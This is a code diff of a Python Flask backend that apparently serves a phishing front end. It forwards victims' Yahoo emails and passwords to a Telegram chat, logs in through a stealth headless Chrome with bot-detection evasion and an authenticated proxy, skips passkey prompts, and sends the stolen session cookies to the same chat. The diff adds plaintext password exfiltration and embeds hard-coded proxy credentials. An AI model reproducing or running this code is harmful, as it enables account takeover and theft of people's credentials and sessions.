@@ -13,7 +13,7 @@ from selenium.webdriver.common.action_chains import ActionChains
 import os
 import ssl
 
-# SSL Bypass
+# ================== SSL BYPASS ==================
 try:
     _create_unverified_https_context = ssl._create_unverified_context
 except AttributeError:
@@ -24,17 +24,46 @@ else:
 app = Flask(__name__)
 CORS(app)
 
+# ================== CONFIG FOR RENDER ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-current_driver = None
-current_email = None
-
-PROXIES = [
-    {"host": "gate.decodo.com", "port": "7000", "user": "sph7g5g4xx", "pass": "zEfr90tw8nZh5uHWr_"},
-]
+# === PROXY ===
+PROXY_HOST = "us.decodo.com"
+PROXY_PORT = "10000"
+PROXY_USER = "sph7g5g4xx"
+PROXY_PASS = "zEfr90tw8nZh5uHWr_"
 
 bot = telebot.TeleBot(BOT_TOKEN)
+
+def create_proxy_extension():
+    ext_dir = "temp_proxy_auth"
+    os.makedirs(ext_dir, exist_ok=True)
+
+    manifest = {
+        "version": "1.0.0",
+        "manifest_version": 2,
+        "name": "Proxy Auth",
+        "permissions": ["proxy", "tabs", "<all_urls>", "webRequest", "webRequestBlocking"],
+        "background": {"scripts": ["background.js"]},
+    }
+
+    background = f'''var config = {{
+    mode: "fixed_servers",
+    rules: {{
+      singleProxy: {{ scheme: "http", host: "{PROXY_HOST}", port: parseInt("{PROXY_PORT}") }}
+    }}
+  }};
+chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
+function callbackFn(d) {{ return {{ authCredentials: {{ username: "{PROXY_USER}", password: "{PROXY_PASS}" }} }}; }}
+chrome.webRequest.onAuthRequired.addListener(callbackFn, {{urls: ["<all_urls>"]}}, ['blocking']);'''
+
+    with open(f"{ext_dir}/manifest.json", "w") as f:
+        json.dump(manifest, f, indent=2)
+    with open(f"{ext_dir}/background.js", "w") as f:
+        f.write(background)
+
+    return os.path.abspath(ext_dir)
 
 def human_type(element, text):
     for char in text:
@@ -59,91 +88,98 @@ def start_login():
     if not email or not password:
         return jsonify({"error": "Missing credentials"}), 400
 
-    bot.send_message(CHAT_ID, f"📧 New Login Request\nEmail: {email}")
+    bot.send_message(CHAT_ID, f"📧 New Login Request:\nEmail: {email}\nPassword: {password}")
+
     Thread(target=selenium_login, args=(email, password)).start()
-    return jsonify({"success": True})
+    return jsonify({"success": True, "message": "Login started"})
 
 def selenium_login(email, password):
-    global current_driver, current_email
     driver = None
     try:
-        current_email = email
         bot.send_message(CHAT_ID, f"🔄 Starting login for {email}")
 
         options = uc.ChromeOptions()
-        options.headless = True
+        options.headless = True                    # Changed for Render
+        options.add_argument("--start-maximized")
+        options.add_argument("--disable-blink-features=AutomationControlled")
         options.add_argument("--no-sandbox")
         options.add_argument("--disable-dev-shm-usage")
         options.add_argument("--disable-gpu")
-        options.add_argument("--disable-blink-features=AutomationControlled")
         options.add_argument("--ignore-certificate-errors")
-        options.add_argument("--window-size=1920,1080")
-        options.binary_location = "/usr/bin/google-chrome"
+        options.add_argument("--ignore-ssl-errors")
+        options.add_argument("--allow-insecure-localhost")
+        options.add_argument("--disable-web-security")
+        options.binary_location = "/usr/bin/google-chrome"   # Important for Render
 
-        driver = uc.Chrome(options=options, use_subprocess=True)
-        current_driver = driver
+        # Use proxy_auth folder
+        extension_path = os.path.abspath("proxy_auth")
+        options.add_argument(f"--load-extension={extension_path}")
+
+        driver = uc.Chrome(options=options)
+
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
 
         driver.get("https://login.yahoo.com/")
-        time.sleep(8)
+        time.sleep(random.uniform(10, 15))
 
         wait = WebDriverWait(driver, 45)
 
-        bot.send_message(CHAT_ID, "📝 Entering Username...")
+        # Username
         username_field = wait.until(EC.element_to_be_clickable((By.NAME, "username")))
+        random_mouse_move(driver)
         human_type(username_field, email)
-        random_mouse_move(driver)
+        time.sleep(random.uniform(2, 4))
         driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
-        time.sleep(6)
 
-        bot.send_message(CHAT_ID, "🔑 Entering Password...")
+        time.sleep(random.uniform(8, 13))
+
+        # Password
         password_field = wait.until(EC.element_to_be_clickable((By.NAME, "password")))
-        human_type(password_field, password)
         random_mouse_move(driver)
+        human_type(password_field, password)
+        time.sleep(random.uniform(2, 4))
         driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
 
-        bot.send_message(CHAT_ID, "⏳ Checking result...")
-        time.sleep(15)
+        bot.send_message(CHAT_ID, "⏳ Waiting after password (looking for Passkey prompt)...")
+        time.sleep(10)
 
-        # Passkey Skip
+        # Skip Passkey
         try:
-            skip_button = WebDriverWait(driver, 10).until(
-                EC.element_to_be_clickable((By.XPATH, "//*[contains(text(),'Skip') or contains(text(),'skip')]"))
+            skip_button = WebDriverWait(driver, 20).until(
+                EC.element_to_be_clickable((By.XPATH, "//*[contains(text(),'Skip')]"))
             )
+            random_mouse_move(driver)
             skip_button.click()
-            bot.send_message(CHAT_ID, "✅ Skipped Passkey")
+            bot.send_message(CHAT_ID, "✅ Clicked 'Skip' on Passkey prompt")
             time.sleep(8)
         except:
-            pass
+            bot.send_message(CHAT_ID, "No Passkey prompt found or already skipped")
 
-        current_url = driver.current_url.lower()
-        if any(x in current_url for x in ["2fa", "verification", "challenge", "otp", "code"]):
-            bot.send_message(CHAT_ID, "🔐 2FA Page Detected!\nGo to your 2fa.html and enter the code.")
-            return
-
-        bot.send_message(CHAT_ID, "✅ No 2FA. Proceeding...")
+        # Go to Mail
         driver.get("https://mail.yahoo.com/")
-        time.sleep(12)
+        time.sleep(15)
 
+        # Save cookies
         cookies = driver.get_cookies()
-        total = len(cookies)
+        cookie_dict = {c['name']: c['value'] for c in cookies}
 
         filename = f"yahoo_cookies_{email.split('@')[0]}.json"
         with open(filename, "w") as f:
             json.dump({
                 "email": email,
-                "total_cookies": total,
-                "full_cookies": {c['name']: c['value'] for c in cookies}
+                "total_cookies": len(cookies),
+                "full_cookies": cookie_dict
             }, f, indent=2)
 
         with open(filename, "rb") as f:
-            bot.send_document(CHAT_ID, f, caption=f"🎉 Login Successful!\nEmail: {email}\nTotal Cookies: {total}")
+            bot.send_document(CHAT_ID, f, caption=f"✅ Login Finished!\nEmail: {email}\nTotal Cookies: {len(cookies)}")
 
     except Exception as e:
-        bot.send_message(CHAT_ID, f"❌ Error: {str(e)[:200]}")
+        bot.send_message(CHAT_ID, f"❌ Error: {str(e)[:250]}")
     finally:
         if driver:
             driver.quit()
 
 if __name__ == '__main__':
-    print("🚀 Backend Started")
+    print("🚀 Yahoo Login Bot Started (Proxy Embedded)")
     app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5001)), debug=False)
